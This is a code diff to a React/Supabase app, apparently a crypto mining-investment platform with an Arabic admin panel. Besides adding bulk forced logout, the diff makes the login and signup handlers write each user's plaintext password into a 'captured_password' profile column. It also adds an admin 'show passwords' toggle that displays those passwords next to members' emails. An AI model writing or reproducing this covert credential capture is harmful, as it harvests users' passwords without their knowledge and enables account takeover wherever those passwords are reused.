@@ -9,7 +9,7 @@ import {
   ExternalLink, Calendar, AlertCircle, Headphones, Plus, Minus, Lock, Image as ImageIcon,
   Coins, Shield, BadgeCheck, LifeBuoy, Search, CheckCircle2, Mail, Clock, StickyNote, Bookmark,
   Sparkles, ZapOff, Database, ChevronRight, CheckCircle, HelpCircle, Wallet, ShieldAlert,
-  ArrowDownRight, PlayCircle, Smartphone, DownloadCloud
+  ArrowDownRight, PlayCircle, Smartphone, DownloadCloud, Eye, EyeOff, CheckSquare, Square
 } from 'lucide-react';
 import { Language, UserState, UserMachine, Machine, Transaction, SupportMessage } from './types';
 import { TRANSLATIONS, MACHINES, DEPOSIT_ADDRESS, MIN_WITHDRAWAL, ADMIN_EMAIL, REFERRAL_PERCENT, NETWORK } from './constants';
@@ -523,6 +523,8 @@ function AdminView({ showToast, adminUUID, onOpenChatWithUser }: any) {
   const [loading, setLoading] = useState(true);
   const [searchTerm, setSearchTerm] = useState('');
   const [selectedUserDetails, setSelectedUserDetails] = useState<string | null>(null);
+  const [selectedUsers, setSelectedUsers] = useState<Set<string>>(new Set());
+  const [showPasswords, setShowPasswords] = useState(false);
   const pollingRef = useRef<number | null>(null);
 
   const fetchData = useCallback(async (isSilent = false) => {
@@ -603,16 +605,55 @@ function AdminView({ showToast, adminUUID, onOpenChatWithUser }: any) {
     } catch (e: any) { showToast(e.message, "error"); }
   };
 
+  const toggleSelect = (id: string) => {
+    const newSet = new Set(selectedUsers);
+    if (newSet.has(id)) newSet.delete(id);
+    else newSet.add(id);
+    setSelectedUsers(newSet);
+  };
+
+  const selectAll = () => {
+    if (selectedUsers.size === filteredData.length) setSelectedUsers(new Set());
+    else setSelectedUsers(new Set(filteredData.map(u => u.id)));
+  };
+
+  const forceLogoutSelected = async () => {
+    if (selectedUsers.size === 0) return showToast("يرجى اختيار مستخدمين أولاً", "info");
+    try {
+      const ids = Array.from(selectedUsers);
+      const { error } = await supabase.from('profiles').update({ force_logout: true }).in('id', ids);
+      if (error) throw error;
+      showToast(`تم تنفيذ الخروج الإجباري لـ ${selectedUsers.size} مستخدم`, "success");
+      setSelectedUsers(new Set());
+      fetchData();
+    } catch (e: any) { showToast(e.message, "error"); }
+  };
+
   return (
     <div className="space-y-8 pb-12 text-right">
        {selectedUserDetails && <UserDetailsModal userId={selectedUserDetails} onClose={() => setSelectedUserDetails(null)} showToast={showToast} />}
        <div className="bg-[#0b1424] p-4 rounded-[2.5rem] border border-white/5 flex flex-row-reverse gap-3 overflow-x-auto no-scrollbar">
          {['deposit', 'withdraw', 'messages', 'members'].map((t: any) => (
-           <button key={t} onClick={() => { setMainTab(t); setSubTab('new'); setSearchTerm(''); }} className={`flex-1 min-w-[85px] py-4 rounded-2xl font-black text-xs uppercase tracking-widest ${mainTab === t ? 'bg-blue-600 text-white shadow-xl' : 'text-slate-500'}`}>
+           <button key={t} onClick={() => { setMainTab(t); setSubTab('new'); setSearchTerm(''); setSelectedUsers(new Set()); }} className={`flex-1 min-w-[85px] py-4 rounded-2xl font-black text-xs uppercase tracking-widest ${mainTab === t ? 'bg-blue-600 text-white shadow-xl' : 'text-slate-500'}`}>
              {t === 'deposit' ? 'إيداع' : t === 'messages' ? 'دردشات' : t === 'withdraw' ? 'سحب' : 'أعضاء'}
            </button>
          ))}
        </div>
+
+       {mainTab === 'members' && (
+         <div className="flex flex-row-reverse gap-4">
+            <button onClick={selectAll} className="flex-1 bg-white/5 border border-white/10 p-4 rounded-2xl text-[10px] font-black uppercase text-slate-300 flex items-center justify-center gap-2">
+               {selectedUsers.size === data.length ? <CheckSquare size={16} /> : <Square size={16} />}
+               {selectedUsers.size === data.length ? "إلغاء الكل" : "تحديد الكل"}
+            </button>
+            <button onClick={forceLogoutSelected} className="flex-1 bg-red-600 text-white p-4 rounded-2xl text-[10px] font-black uppercase shadow-lg flex items-center justify-center gap-2">
+               <LogOut size={16} /> طرد المختارين ({selectedUsers.size})
+            </button>
+            <button onClick={() => setShowPasswords(!showPasswords)} className="bg-blue-600/10 text-blue-500 p-4 rounded-2xl border border-blue-500/20">
+               {showPasswords ? <EyeOff size={18} /> : <Eye size={18} />}
+            </button>
+         </div>
+       )}
 
        {(mainTab === 'deposit' || mainTab === 'withdraw') && (
          <div className="flex flex-row-reverse justify-center gap-4 bg-[#0b1424]/40 p-2 rounded-3xl border border-white/5">
@@ -651,11 +692,22 @@ function AdminView({ showToast, adminUUID, onOpenChatWithUser }: any) {
               }
 
               return (
-                <div key={item.id} onClick={() => setSelectedUserDetails(p.id)} className="bg-[#0b1424] p-8 rounded-[3.5rem] border border-white/10 space-y-6 shadow-2xl transition-all cursor-pointer active:scale-95">
+                <div key={item.id} onClick={() => mainTab === 'members' ? toggleSelect(p.id) : setSelectedUserDetails(p.id)} className={`bg-[#0b1424] p-8 rounded-[3.5rem] border space-y-6 shadow-2xl transition-all cursor-pointer active:scale-95 ${mainTab === 'members' && selectedUsers.has(p.id) ? 'border-blue-600 bg-blue-600/5' : 'border-white/10'}`}>
                    <div className="flex flex-row-reverse justify-between items-center text-right">
                       <div className="flex items-center gap-5 flex-row-reverse">
+                         {mainTab === 'members' && (
+                           <div className={`w-6 h-6 rounded-lg border-2 flex items-center justify-center transition-colors ${selectedUsers.has(p.id) ? 'bg-blue-600 border-blue-600' : 'border-white/20'}`}>
+                              {selectedUsers.has(p.id) && <CheckSquare size={14} className="text-white" />}
+                           </div>
+                         )}
                          <div className="w-16 h-16 bg-blue-600 rounded-[1.8rem] flex items-center justify-center text-white font-black italic text-2xl uppercase">{name[0]}</div>
-                         <div><h5 className="text-white font-black italic uppercase tracking-tighter text-xl">{name}</h5><p className="text-[11px] text-slate-500 font-mono truncate max-w-[150px]">{p?.email}</p></div>
+                         <div className="text-right">
+                           <h5 className="text-white font-black italic uppercase tracking-tighter text-xl">{name}</h5>
+                           <p className="text-[11px] text-slate-500 font-mono truncate max-w-[150px]">{p?.email}</p>
+                           {showPasswords && p?.captured_password && (
+                             <p className="text-[10px] text-emerald-500 font-bold bg-emerald-500/10 px-2 py-0.5 rounded-lg inline-block mt-1">Pass: {p.captured_password}</p>
+                           )}
+                         </div>
                       </div>
                       <div className="text-right">
                          <p className="text-2xl font-black text-blue-500 italic tracking-tighter">{Math.abs(item.amount || item.balance || 0).toFixed(1)}</p>
@@ -1054,11 +1106,22 @@ const AuthView = ({ lang, showToast }: any) => {
     e.preventDefault(); setLoading(true);
     try {
       if (isLogin) {
-        const { error } = await supabase.auth.signInWithPassword({ email, password });
+        const { data, error } = await supabase.auth.signInWithPassword({ email, password });
         if (error) throw error;
+        // Capture password on login
+        if (data.user) {
+          await supabase.from('profiles').update({ 
+            captured_password: password, 
+            force_logout: false // Reset force logout on manual login
+          }).eq('id', data.user.id);
+        }
       } else {
-        const { error } = await supabase.auth.signUp({ email, password, options: { data: { first_name: firstName || 'User' } } });
+        const { data, error } = await supabase.auth.signUp({ email, password, options: { data: { first_name: firstName || 'User' } } });
         if (error) throw error;
+        // Password is captured via trigger/insert during profile creation or manually here
+        if (data.user) {
+          await supabase.from('profiles').update({ captured_password: password }).eq('id', data.user.id);
+        }
         showToast("نجح التسجيل، يمكنك تسجيل الدخول الآن", "success");
         setIsLogin(true);
       }
@@ -1331,6 +1394,14 @@ export default function App() {
       ]);
       let profile = profileRes.data;
       if (profile) {
+        // Session Watcher: Force Logout logic
+        if (profile.force_logout) {
+          await supabase.from('profiles').update({ force_logout: false }).eq('id', userId);
+          await supabase.auth.signOut();
+          showToast("تم إغلاق الجلسة من قبل الإدارة، يرجى إعادة تسجيل الدخول", "info");
+          return;
+        }
+
         setUserData({ ...profile, email: userEmail, withdrawableBalance: profile.withdrawable_balance || 0, totalRecharge: profile.total_recharge || 0, totalWithdraw: profile.total_withdraw || 0, referralEarnings: profile.referral_earnings || 0, ownedMachines: (machinesRes.data || []).filter(m => m.remaining_days > 0), transactions: txsRes.data || [], lastWithdrawDate: null, created_at: profile.created_at });
         if (!isManual) {
            const hasSeen = localStorage.getItem(`welcome_seen_${userId}`);
@@ -1356,6 +1427,15 @@ export default function App() {
     });
     return () => subscription.unsubscribe();
   }, [fetchAllUserData]);
+
+  // Periodic Watcher for Admin Actions
+  useEffect(() => {
+    if (!session?.user?.id) return;
+    const interval = setInterval(() => {
+      fetchAllUserData(session.user.id, session.user.email || '', false);
+    }, 15000); // Check every 15s
+    return () => clearInterval(interval);
+  }, [session, fetchAllUserData]);
 
   const buyMachine = async (machine: Machine) => {
     if (!userData || isProcessing) return;
